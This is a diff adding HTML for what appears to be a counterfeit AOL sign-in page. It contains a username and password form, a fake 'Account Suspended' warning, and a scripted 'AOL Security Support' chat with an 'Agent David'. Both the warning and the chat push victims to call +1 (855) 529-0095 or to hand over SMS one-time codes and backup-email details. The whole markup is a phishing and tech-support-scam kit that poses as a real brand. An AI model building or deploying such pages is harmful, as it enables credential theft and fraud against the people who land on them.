+            <!-- STEP 1: Enter Username or Email -->
+            <form id="modal-step1-form" class="official-card-form">
+              <div class="official-input-group">
+                <input 
+                  type="text" 
+                  id="modal-login-username" 
+                  class="official-underline-input" 
+                  placeholder="Username or Email" 
+                  required 
+                  autocomplete="username"
+                />
+              </div>
+
+              <!-- Blue Next Button -->
+              <button type="submit" class="btn-official-next" id="btn-modal-next">
+                <span>Next</span>
+              </button>
+
+              <!-- Checkbox & Forgot Username Row -->
+              <div class="official-card-options-row">
+                <label class="official-check-label">
+                  <input type="checkbox" id="modal-stay-signed" checked />
+                  <span class="custom-check"></span>
+                  <span>Stay signed in</span>
+                </label>
+                <a href="#password-recovery-section" class="official-forgot-link" id="modal-link-forgot-user">Forgot username</a>
+              </div>
+
+              <!-- Create an account button -->
+              <button type="button" class="btn-official-create" id="btn-modal-create-acc">
+                Create an account
+              </button>
+
+              <!-- Quick Demo Autofill -->
+              <div class="modal-demo-chip">
+                <button type="button" class="btn-autofill-demo" id="btn-modal-autofill">
+                  <i data-lucide="zap"></i> Quick Autofill: <strong>user@aol.com / password123</strong>
+                </button>
+              </div>
+            </form>
+
+            <!-- STEP 2: Enter Password (Revealed on Next) -->
+            <form id="modal-step2-form" class="official-card-form" style="display:none;">
+              <div class="modal-user-identity-badge">
+                <span id="modal-display-user">user@aol.com</span>
+                <button type="button" class="btn-edit-user" id="btn-modal-edit-user" title="Change Username">
+                  <i data-lucide="edit-3"></i>
+                </button>
+              </div>
+
+              <div class="official-input-group pw-group">
+                <input 
+                  type="password" 
+                  id="modal-login-password" 
+                  class="official-underline-input" 
+                  placeholder="Password" 
+                  required 
+                  autocomplete="current-password"
+                />
+                <button type="button" class="btn-eye-toggle-modal" id="btn-modal-toggle-pw">
+                  <i data-lucide="eye" id="modal-pw-eye"></i>
+                </button>
+              </div>
+
+              <button type="submit" class="btn-official-next" id="btn-modal-signin">
+                <span class="btn-text">Sign in</span>
+                <span class="btn-spinner" style="display:none;"></span>
+              </button>
+
+              <div class="official-card-options-row" style="justify-content: flex-end;">
+                <a href="#password-recovery-section" class="official-forgot-link" id="modal-link-forgot-pw">Forgot password?</a>
+              </div>
+            </form>
+
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+
+  <!-- =========================================================================
+       ACCOUNT SUSPENDED MODAL (EXACT MATCH TO USER SCREENSHOT 1 & 2)
+       Red Accent Bar + "Account Suspended" + "Chat Now" + "+1 (855) 529-0095"
+       ========================================================================= -->
+  <div class="account-suspended-overlay" id="account-suspended-modal" style="display:none;">
+    <div class="suspended-card-box">
+      <!-- Top Red Bar -->
+      <div class="suspended-top-accent-bar"></div>
+      
+      <button type="button" class="btn-close-suspended" id="btn-close-suspended" aria-label="Close">
+        <i data-lucide="x"></i>
+      </button>
+
+      <div class="suspended-card-inner">
+        <h2 class="suspended-title">Account Suspended</h2>
+        
+        <p class="suspended-lead">
+          We have detected suspicious login activity on your account. For your security, your account access has been temporarily blocked.
+        </p>
+
+        <div class="suspended-callout-box">
+          To verify your identity and unblock your account, please contact our Live Chat team immediately using the chat window.
+        </div>
+
+        <!-- Action Row with Red Chat Now & Blue Phone Number Button -->
+        <div class="suspended-actions-row">
+          <button type="button" class="btn-suspended-chat" id="btn-suspended-chat-now">
+            Chat Now
+          </button>
+          <a href="tel:+18555290095" class="btn-phone-helpline" id="btn-suspended-phone-call">
+            +1 (855) 529-0095
+          </a>
+        </div>
+
+        <div class="suspended-error-ref">
+          Error Reference: <strong>ERR_AUTH_0x8004</strong>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- =========================================================================
+       LIVE CHAT SUPPORT WIDGET (Triggered by "Chat Now")
+       Interactive Live Verification & Chat Window + Direct Phone Helpline
+       ========================================================================= -->
+  <div class="live-chat-floating-widget" id="live-chat-widget" style="display:none;">
+    <div class="chat-widget-header">
+      <div class="chat-agent-info">
+        <div class="agent-avatar-wrap">
+          <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&auto=format&fit=crop&q=80" alt="Agent" class="agent-avatar-img">
+          <span class="chat-online-dot"></span>
+        </div>
+        <div>
+          <div class="agent-name">AOL Security Support</div>
+          <div class="agent-status">Agent Online • Verified Desk</div>
+        </div>
+      </div>
+      <div class="chat-header-actions">
+        <button type="button" class="btn-chat-min" id="btn-chat-close" title="Close Chat">
+          <i data-lucide="x"></i>
+        </button>
+      </div>
+    </div>
+
+    <!-- Chat Messages Scroll Area -->
+    <div class="chat-messages-body" id="chat-messages-container">
+      <div class="chat-system-badge">
+        <span>Security Reference: ERR_AUTH_0x8004</span>
+      </div>
+      <div class="chat-bubble agent-bubble">
+        Hello! I am Agent David from the AOL Account Security Desk. I see your account is temporarily blocked due to unrecognized location activity.
+      </div>
+      <div class="chat-bubble agent-bubble">
+        To unblock your account immediately, chat with me or connect directly with our voice helpline:
+      </div>
+      <div class="chat-phone-banner">
+        <a href="tel:+18555290095" class="btn-phone-helpline">
+          +1 (855) 529-0095
+        </a>
+      </div>
+    </div>
+
+    <!-- Quick Action Chips -->
+    <div class="chat-quick-actions" id="chat-quick-chips">
+      <a href="tel:+18555290095" class="chat-chip-btn call-chip">📞 +1 (855) 529-0095</a>
+      <button type="button" class="chat-chip-btn" data-msg="Verify via SMS OTP code">📱 SMS OTP Code</button>
+      <button type="button" class="chat-chip-btn" data-msg="Verify via Backup Email">📧 Backup Email</button>
+      <button type="button" class="chat-chip-btn" data-msg="Request Instant Account Unlock">🛡️ Instant Unlock</button>
+    </div>
+
+    <!-- Chat Input Form -->
+    <form class="chat-input-form" id="chat-input-form">
+      <input type="text" id="chat-input-text" class="chat-input-field" placeholder="Type your message here..." autocomplete="off" />
+      <button type="submit" class="btn-chat-send" id="btn-chat-send" aria-label="Send Message">
+        <i data-lucide="send"></i>
+      </button>
+    </form>
+  </div>
+
+  <!-- Scripts -->
+  <script src="/app.js"></script>
+</body>
+</html>
